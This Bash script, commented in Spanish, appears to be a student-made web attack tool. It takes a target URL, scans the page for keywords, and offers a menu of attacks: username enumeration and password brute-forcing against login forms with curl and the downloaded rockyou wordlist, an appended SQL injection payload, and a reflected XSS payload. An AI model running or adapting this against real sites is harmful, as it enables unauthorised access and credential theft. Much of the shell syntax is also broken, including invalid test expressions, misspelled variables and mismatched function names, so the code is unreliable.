#!/bin/bash
#source controlerror.sh
#/bin/bash
volvermenu() {
#esta funcion sirve para ser llamada cuando se acaba un ataque
    read -p "Introduzca Q o q para salir y m o M para volver al menu: " letra  #se guaradara lo que pongas en letra 
    case "$letra" in
        m|M)																	#si se cumple una de estas 2 directivas te devolvera al menu principal
			clear
            'menuPrincipal'
            ;;
        q|Q)																	#si se cumple una de estas 2 directivas te sacara del programa
			clear
            exit
            ;;
        *)  
            echo "No has introducido m ni q"									#si marcas cualquier cosa te dara error y te devovlera al mismo menu hasta que pongas una de las 2 condiciones que hay
            clear
	    'volvermenu'
            ;;
    esac
}
#!/bin/bash
instalaciones() {
	    sudo apt-get update	> /dev/null 2>&1				#te hara una actualizacion 
            dpkg -s unzip > /dev/null 2>&1 			#revisa si se encuentra istalado
	    if [ $? -ne 0 ]								#si esta dara 1 asi que te dira que esta instalado y no hara nada 
	
	        then
	            echo "UNZIP not installed, installing..."  
	            sudo apt-get install unzip -y > /dev/null 2>&1	#te instalara el paquete
	
	        else
	            echo    "UNZIP Installed"
	    fi
	    
	    dpkg -s curl > /dev/null 2>&1  			#revisa si se encuentra istalado
	    
	    if [ $? -ne 0 ]								#si esta dara 1 asi que te dira que esta instalado y no hara nada 
	
	        then
	            echo "curl not installed, installing..."  
	            sudo apt-get install curl -y > /dev/null 2>&1	#te instalara el paquete
	
	        else
	            echo    "curl Installed"
	    fi
	    dpkg -s gnupg > /dev/null 2>&1  			#revisa si se encuentra istalado

	    if [ $? -ne 0 ]								#si esta dara 1 asi que te dira que esta instalado y no hara nada 
	
	        then
	            echo "gnupg not installed, installing..."  
	            sudo apt-get install gnupg -y > /dev/null 2>&1	#te instalara el paquete
	
	        else
	            echo    "gnupg Installed"
	    fi
	    clear
}
#!/bin/bash
diccionario() {
start=1
URL=$(echo -e "$url")
document=a.txt
echo "Dime un usuario o un fichero txt con un listado de usuarios, deja en blanco para la demo.\n"
read document
#Comprobamos que el usuario haya contestado y sino le asignamos el valor que se usa en la demo
if [[ -z $document ]]
then
    document=a.txt
fi
ok=0
vale=0
#Una vez declarados todos los valores y preparado todo, empezamos comprobando el listado de usuarios o nombre de usuario designado, en caso de que sea un listado se hace lo siguiente. 
if [[ -f  $document ]]
then
    echo "Recuerda que este proceso puede tardar minutos.\n"
    total=$(wc -l < $document)
    #por tantas lineas de documento ejecutamos un script que haga que compruebe si la url de error es diferente en cada caso
    while [[ $start -le $total ]]
        do
        test=$(awk "NR==$start{print $1}" $document)
        if [[ $(curl -s -d "username=$test&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            username=$test
            vale=1
            break 0
        fi
        #si la url de error es diferente, significa que hemos encontrado el nombre de usuario.
        ((start = start + 1))
    done
else
#si nos han pasado un solo nombre de usuario en vez de una variable se hace la misma comprobacion sin el bucle
    if [[! $(curl -s -d "username=$document&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            username=$document
            vale=1
            break 0
        else
            echo "Usuario inexistente.\n"
            'volvermenu'
        fi
fi
#si da error  cerramos el programa
if [[ $vale!=1 ]]
then
    echo -e "No hemos podido encontrar un usuario valido.\n"
    'volvermenu'
fi
#Solicitamos que el usuario nos pase un diccioanrio de contraseñas que puede haber generado con Jhon the ripper o sino podemos utilizar el de demos o el rockyou
echo "Quieres utilizar un diccionario de contraseñas en especifico? Indica la ruta del fichero de ser así, si no omite la respuesta.\n"
read document
if [[ -f  $document ]] 
then
    echo "Fichero valido.\n"
else
    echo "El Fichero no es valido, usaremos un diccionario propio.\n"
#Si ha dejado en blanco el campo usaremos rockyou o la demo
    if [[ -z $document ]]
    then
        echo "Quieres utilizar rockyou? Si quieres usar la demo omite la respuesta.\n"
        read document
        if [[ -z $document ]]
        then
            wget -q "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
            document=rockyou.txt
        else
            document=b.txt
        fi
    fi
fi
start=1
total=$(wc -l < $document)
#ahora que disponemos de un documento de contraseñas utilizamos el usuario previamente encontrado y ejecutamos el test de contraseñas buscando que la respuesta del servidor sea una redirección.
while [[ $start -le $total ]]
    do
    test=$(awk "NR==$start{print $1}" $document)
    if ! [[ $(curl -i -s -d "username=$username&password=$test" $URL | grep -e "302 Found") ]]
    then
        password=$test
        ok=1
        break 0
    fi
    ((start = start + 1))
done
#si hemos descargado anteriormente rockyou.txt, lo borramos
if [[ -f  rockyou.txt ]]
then
    rm rockyou.txt
fi
#ahora muestra los resultados por pantalla
if [[ $ok==1 ]]
then
    echo -e "El usuario es $usuari y su contraseña és $password ."
    'volvermenu'
else
    echo -e "El usuario es $usuari ."
    echo -e "La contraseña no se encuentra en el diccionario, lo sentimos."
    'volvermenu'
fi
}
#!/bin/bash
checkurl() {
#este script pide una url al usuario y si no dispone de una url vuelve a llamar a la funcion de pedir una url, si todo va bien, cierra la funcion y devuelve como valor un string con la url.
read -p "Introduce una url: " url
if [ "$url" != "" ]
then
    if [ curl -i -s $url | grep "200 OK" ]
    then
        return $url
    else
        echo -e "La url $url no es valida"
    fi
else
    echo -e "No has introducido ninguna URL"
    'checkurl'
fi
}
#!/bin/bash
xss() {
#aqui ejecutamos xss con get, checkear si esta search
if [[ $search ]] # | grep 'method=\"GET\"' ]]
then
  XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
  ATTACK="$URL$XSS"
  if [[ curl -i $ATTACK | grep "200 OK" ]]
  then
    echo -e "Haz clic en el siguiente enlace para ver el resultado del ataque: \n$ATTACK"
  else
    echo "Disculpa, el ataque no ha funcionado."
    'volvermenu'
  fi
fi
}
#!/bin/bash
sqli() {
#preparamos las variables
URL=$(echo -e "$url")
SQLi="%27+OR+1=1--"
ATTACK="$URL$SQLi"
#si el ataque funciona
if [ curl -i "$ATTACK" | grep "200 OK" ]
then
#muestrame por pantalla una url con el resultado
  echo -e "Haz clic en el siguiente enlace para ver el resultado del ataque: \n$ATTACK"
else
#si no funciona muestra este mensaje de error y cierra el programa
  echo "Disculpa, el ataque no ha funcionado."
  'volvermenu'
fi
}
#!/bin/bash
vectores() {
#creamos algunas variables con datos sobre el contenido de la web
   csrf=$(wget -q -O - "$1" | grep "csrf")
   login=$(wget -q -O - "$1" | grep "login")
   filter=$(wget -q -O -  "$1" | grep "filter") 
   search=$(wget -q -O - "$1" | grep "search")
   category=$(wget -q -O - "$1" | grep "category")
   password=$(wget -q -O - "$1" | grep "password")
   username=$(wget -q -O - "$1" | grep "username")
   product=$(wget -q -O - "$1" | grep "product")
   if [ wget -q -O - "$1" | grep "product" ]  || [ echo "$url" | grep "product" ]
   then
   
   #si estos parametros estan presentes en la web o la url, nos lo anotamos
      product="a"
   fi
   if [ wget -q -O - "$1" | grep "password" ]  || [ echo "$url" | grep "password" ]
   then
   
   #si estos parametros estan presentes en la web o la url, nos lo anotamos
      password="a"
   fi
   if [ wget -q -O - "$1" | grep "username" ]  || [ echo "$url" | grep "username" ]
   then
   
   #si estos parametros estan presentes en la web o la url, nos lo anotamos
      username="a"
   fi
      if [ wget -q -O - "$1" | grep "login" ] || [ echo "$url" | grep "login" ]
   then
   
   #si estos parametros estan presentes en la web o la url, nos lo anotamos
      login="a"
   fi
      if [ wget -q -O - "$1" | grep "category" ]  || [ echo "$url" | grep "category" ]
   then
   
   #si estos parametros estan presentes en la web o la url, nos lo anotamos
      category="a"
   fi
   if [ wget -q -O - "$1" | grep "search" ]  || [ echo "$url" | grep "search" ]
   then
   
   #si estos parametros estan presentes en la web o la url, nos lo anotamos
      search="a"
   fi
      if [ wget -q -O - "$1" | grep "filter" ]  || [ echo "$url" | grep "filter" ]
   then
   #si estos parametros estan presentes en la web o la url, nos lo anotamos
      filter="a"
   fi
   if [ "$csrf" ]
   then
   #si dispone la web de un parametro CSRF (cros site request forgery) sabemos que disponen de un token CSRF y esta herramienta no puede hacer nada contra eso
       echo "Esta herramienta no puede atacar a esta URL.\n"
       'volvermenu'
   else
    if [ "$login" ] || [ "$password" ] || [ "$username" ]
    then
    #si estas variables contienen algo, damos a la variable diccionario el valor diccionario
       diccionario="diccionario"
    fi
    if [ "$filter" ] || [ "$category" ] || [ "$product" ]
    then
    #si estas variables contienen algo, damos a la variable sql el valor sql
       sql="sql"
    fi
    if [ "$search" ]
    then
    #si esta variable contiene algo, damos a la variable xss el valor xss
       xss="xss"
    fi
   fi
   #concatenamos las variables y las devolvemos como parametro resultante al llamar a la funcion
   vectores = $sql$xss$diccionario
   return $vectores
}
menuprincipal() {  
    clear
    #Llamamos a la funcion url para pedir al usuario la web a la que quiere atacar.
    url=$(checkurl)
    #Llamamos a la funcion vectores para, una vez identificada la web objetivo que analice los posibles vectores de ataque.
    vector=$(vectores $url)
    #Sacamos por pantalla los posibles vectores de ataque.
    echo "Los ataques disponibles a la página web " . $url . " son los que aparecen a continuación: "
    if [ echo "$vector" | grep "xss" && grep "diccionario" && grep "sql" ]
    then
    	#Indicamos que tipo de ataque puede ejecutar segun el resultado de la funcion vectores y le pide al usuario que elija cual utilizar
    	echo -e "Para ejecutar un ataque de Diccionario pulsa 1.\nPara ejecutar un ataque de SqlInjection pulsa 2.\nPara ejecutar un ataque de XSS pulsa 3."
     	read -p "" tipoDeAtaque
	'instalaciones'
	case $tipoDeAtaque in
		1)
			clear
			'diccionario'
			;;
		2)
			clear
			'sqli'
			;;
		3)
			clear
			'xss'
			;;
		*)
			echo "Opcion no valida."
			'volvermenu'
	esac
    elif [ echo "$vector" | grep "xss" && grep "diccionario" ]
    then
    	#Indicamos que tipo de ataque puede ejecutar segun el resultado de la funcion vectores y le pide al usuario que elija cual utilizar
    	echo -e "Para ejecutar un ataque de Diccionario pulsa 1.\nPara ejecutar un ataque de XSS pulsa 2."
	     read -p "" tipoDeAtaque
	'instalaciones'
	case $tipoDeAtaque in
		1)
			clear
			'diccionario'
			;;
		2)
			clear
			'xss'
			;;
		*)
			echo "Opcion no valida."
			'volvermenu'
	esac
     elif [ echo "$vector" | grep "sql" && grep "diccionario" ]
     then
     	#Indicamos que tipo de ataque puede ejecutar segun el resultado de la funcion vectores y le pide al usuario que elija cual utilizar
	echo -e "Para ejecutar un ataque de Diccionario pulsa 1.\nPara ejecutar un ataque de SQL pulsa 2."
	read -p "" tipoDeAtaque
	'instalaciones'
	case $tipoDeAtaque in
		1)
			clear
			'diccionario'
			;;
		2)
			clear
			'sqli'
			;;
		*)
			echo "Opcion no valida."
			'volvermenu'
	esac
     elif [ echo "$vector" | grep "diccionario" ]
     then
     	#Indicamos que tipo de ataque puede ejecutar segun el resultado de la funcion vectores y le pide al usuario que elija cual utilizar
	    echo -e "Para ejecutar un ataque de Diccionario pulsa 1."
	    read -p "" tipoDeAtaque
	    'instalaciones'
	    case $tipoDeAtaque in
		1)
			clear
			'diccionario'
			;;
		*)
			echo "Opcion no valida."
			'volvermenu'
	esac
     elif [ echo "$vector" | grep "xss" && grep "sql" ]
     then
     	echo -e "Para ejecutar un ataque de SQL pulsa 1.\nPara ejecutar un ataque de XSS pulsa 2."
	read -p "" tipoDeAtaque
	'instalaciones'
	case $tipoDeAtaque in
		1)
			clear
			'sqli'
			;;
		2)
			clear
			'xss'
			;;
		*)
			echo "Opcion no valida."
			'volvermenu'
	esac 
      elif [ echo "$vector" | grep "sql" ]
      then
      	#Indicamos que tipo de ataque puede ejecutar segun el resultado de la funcion vectores y le pide al usuario que elija cual utilizar
      	echo -e "Para ejecutar un ataque de SqlInjection pulsa 1.\n"
     	read -p "" tipoDeAtaque
	'instalaciones'
	case $tipoDeAtaque in
		1)
			clear
			'sqli'
			;;
		*)
			echo "Opcion no valida."
			'volvermenu'
	esac
      elif [ echo "$vector" | grep "xss" ]
      then
      	#Indicamos que tipo de ataque puede ejecutar segun el resultado de la funcion vectores y le pide al usuario que elija cual utilizar
        echo -e "Para ejecutar un ataque de XSS pulsa 1."
     	read -p "" tipoDeAtaque
	'instalaciones'
	case $tipoDeAtaque in
		1)
			clear
			'xss'
			;;
		*)
			echo "Opcion no valida."
			'volvermenu'
	esac
	fi
}

'menuprincipal'
